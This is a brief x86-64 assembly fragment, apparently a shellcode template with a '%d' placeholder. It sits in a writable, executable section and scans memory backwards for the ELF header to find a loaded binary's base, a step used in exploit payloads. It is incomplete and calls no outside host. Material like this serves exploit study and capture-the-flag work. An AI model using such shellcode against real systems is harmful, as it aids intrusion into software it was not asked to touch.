
.section .shellcode,"awx"
.global _start
_start:
mov rax,[rsp];
find_elf:
mov ecx,2;
xor rcx,rcx;
mov ecx,dword ptr [rax];
xor ecx,0x464c457f
sub rax,1;
inc ecx;
loopnz  find_elf;
inc rax;
mov rax,[rax+8*%d];


